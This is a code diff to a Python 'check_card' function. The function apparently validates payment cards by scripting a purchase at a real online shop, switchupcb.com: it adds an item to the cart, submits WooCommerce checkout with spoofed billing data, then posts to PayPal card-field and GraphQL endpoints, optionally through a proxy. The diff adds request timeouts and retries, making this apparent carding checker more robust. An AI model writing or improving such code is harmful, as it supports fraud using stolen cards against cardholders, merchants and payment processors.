@@ -75,13 +75,17 @@ def check_card(card_input, proxy=None):
     user = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
     r = setup_proxy_session(proxy)
 
+    # Set timeouts for requests
+    r.mount('https://', requests.adapters.HTTPAdapter(max_retries=3))
+    timeout = 30  # seconds per request
+
     # Initial GET
     try:
         r.get('https://switchupcb.com/shop/i-buy/', headers={
             'User-Agent': user,
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
             'Upgrade-Insecure-Requests': '1'
-        })
+        }, timeout=timeout)
     except Exception as e:
         pass
 
@@ -111,7 +115,7 @@ def check_card(card_input, proxy=None):
     }
 
     try:
-        response = r.post('https://switchupcb.com/shop/i-buy/', headers=headers, data=multipart_data)
+        response = r.post('https://switchupcb.com/shop/i-buy/', headers=headers, data=multipart_data, timeout=timeout)
         response.raise_for_status()
     except requests.RequestException as e:
         return {"status": "error", "message": f"Add to cart failed: {e}"}
@@ -134,7 +138,7 @@ def check_card(card_input, proxy=None):
     }
 
     try:
-        response = r.get('https://switchupcb.com/checkout/', cookies=r.cookies, headers=headers)
+        response = r.get('https://switchupcb.com/checkout/', cookies=r.cookies, headers=headers, timeout=timeout)
         response.raise_for_status()
     except requests.RequestException as e:
         return {"status": "error", "message": f"Checkout failed: {e}"}
@@ -169,7 +173,7 @@ def check_card(card_input, proxy=None):
     data = f'security={sec}&payment_method=stripe&country=US&state={state}&postcode={zip_code}&city={city}&address={street_address}&address_2=&s_country=US&s_state={state}&s_postcode={zip_code}&s_city={city}&s_address={street_address}&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fswitchupcb.com%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3D{first_name}%26billing_last_name%3D{last_name}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D{street_address}%26billing_address_2%3D%26billing_city%3D{city}%26billing_state%3D{state}%26billing_postcode%3D{zip_code}%26billing_phone%3D{num_val}%26billing_email%3D{acc}%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'
 
     try:
-        response = r.post('https://switchupcb.com/', params=params, headers=headers, data=data)
+        response = r.post('https://switchupcb.com/', params=params, headers=headers, data=data, timeout=timeout)
         response.raise_for_status()
     except requests.RequestException as e:
         return {"status": "error", "message": f"Update order review failed: {e}"}
@@ -208,7 +212,7 @@ def check_card(card_input, proxy=None):
     }
 
     try:
-        response = r.post('https://switchupcb.com/', params=params, cookies=r.cookies, headers=headers, json=json_data)
+        response = r.post('https://switchupcb.com/', params=params, cookies=r.cookies, headers=headers, json=json_data, timeout=timeout)
         response.raise_for_status()
         id = response.json()['data']['id']
     except (requests.RequestException, KeyError, ValueError) as e:
@@ -251,7 +255,7 @@ def check_card(card_input, proxy=None):
     }
 
     try:
-        response = r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers)
+        response = r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers, timeout=timeout)
         response.raise_for_status()
     except requests.RequestException as e:
         return {"status": "error", "message": f"PayPal card fields request failed: {e}"}
@@ -303,7 +307,7 @@ def check_card(card_input, proxy=None):
     }
 
     try:
-        response = r.post('https://www.paypal.com/graphql', headers=headers, json=json_data)
+        response = r.post('https://www.paypal.com/graphql', headers=headers, json=json_data, timeout=timeout)
         response.raise_for_status()
         last = response.text
     except requests.RequestException as e:
